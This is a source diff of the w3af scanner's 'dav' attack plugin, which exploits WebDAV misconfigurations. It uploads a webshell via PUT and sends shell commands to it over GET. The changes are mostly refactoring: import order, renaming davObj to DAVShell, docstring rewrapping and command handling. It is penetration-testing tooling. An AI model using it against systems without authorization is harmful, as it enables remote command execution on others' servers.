@@ -19,24 +19,20 @@ along with w3af; if not, write to the Free Software
 Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
+import urllib
 
-
-from core.data.fuzzer.fuzzer import rand_alpha
 import core.controllers.outputManager as om
-# options
-from core.data.options.option import option
-from core.data.options.option_list import OptionList
-from core.controllers.plugins.attack_plugin import AttackPlugin
-
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
+import plugins.attack.payloads.shell_handler as shell_handler
+
+from core.data.options.option import option
+from core.data.options.option_list import OptionList
+from core.data.fuzzer.fuzzer import rand_alpha
 from core.data.kb.exec_shell import exec_shell as exec_shell
 from core.data.parsers.urlParser import url_object
-
 from core.controllers.w3afException import w3afException
-
-import plugins.attack.payloads.shell_handler as shell_handler
-import urllib
+from core.controllers.plugins.attack_plugin import AttackPlugin
 
 
 class dav(AttackPlugin):
@@ -93,7 +89,7 @@ class dav(AttackPlugin):
         # Check if we really can execute commands on the remote server
         if self._verify_vuln( vuln_obj ):
             # Create the shell object
-            shell_obj = davObj( vuln_obj )
+            shell_obj = DAVShell( vuln_obj )
             shell_obj.set_url_opener( self._uri_opener )
             shell_obj.setExploitURL( self._exploit_url )
             return shell_obj
@@ -171,10 +167,12 @@ class dav(AttackPlugin):
 
     def getRootProbability( self ):
         '''
-        @return: This method returns the probability of getting a root shell using this attack plugin.
-        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
-        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
-        return a root shell.
+        @return: This method returns the probability of getting a root shell
+                 using this attack plugin. This is used by the "exploit *"
+                 function to order the plugins and first try to exploit the
+                 more critical ones. This method should return 0 for an exploit
+                 that will never return a root shell, and 1 for an exploit that
+                 WILL ALWAYS return a root shell.
         '''
         return 0.8
         
@@ -183,15 +181,17 @@ class dav(AttackPlugin):
         @return: A DETAILED description of the plugin functions and features.
         '''
         return '''
-        This plugin exploits webDAV misconfigurations and returns a shell. It's rather simple, using the dav method
-        "PUT" the plugin uploads the corresponding webshell ( php, asp, etc. ) verifies that the shell is working, and if
-        everything is working as expected the user can start typing commands.
+        This plugin exploits webDAV misconfigurations and returns a shell. It is
+        rather simple, using the dav method "PUT" the plugin uploads the
+        corresponding webshell ( php, asp, etc. ) verifies that the shell is
+        working, and if everything is working as expected the user can start 
+        typing commands.
         
         One configurable parameter exists:
             - URL (only used in fastExploit)
         '''
         
-class davObj(exec_shell):
+class DAVShell(exec_shell):
     def setExploitURL( self, eu ):
         self._exploit_url = eu
     
@@ -206,20 +206,20 @@ class davObj(exec_shell):
         @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
-        to_send = self.getExploitURL() + urllib.quote_plus( command )
+        to_send = self.getExploitURL() + command
         to_send = url_object( to_send )
         response = self._uri_opener.GET( to_send )
-        return response.getBody()
+        return shell_handler.extract_result( response.getBody())
     
     def end( self ):
-        om.out.debug('davObj is going to delete the webshell that was uploaded before.')
+        om.out.debug('DAVShell is going to delete the webshell that was uploaded before.')
         url_to_del = self._exploit_url.uri2url()
         try:
             self._uri_opener.DELETE( url_to_del )
         except w3afException, e:
-            om.out.error('davObj cleanup failed with exception: ' + str(e) )
+            om.out.error('DAVShell cleanup failed with exception: ' + str(e) )
         else:
-            om.out.debug('davObj cleanup complete.')
+            om.out.debug('DAVShell cleanup complete.')
         
     def getName( self ):
         return 'dav'
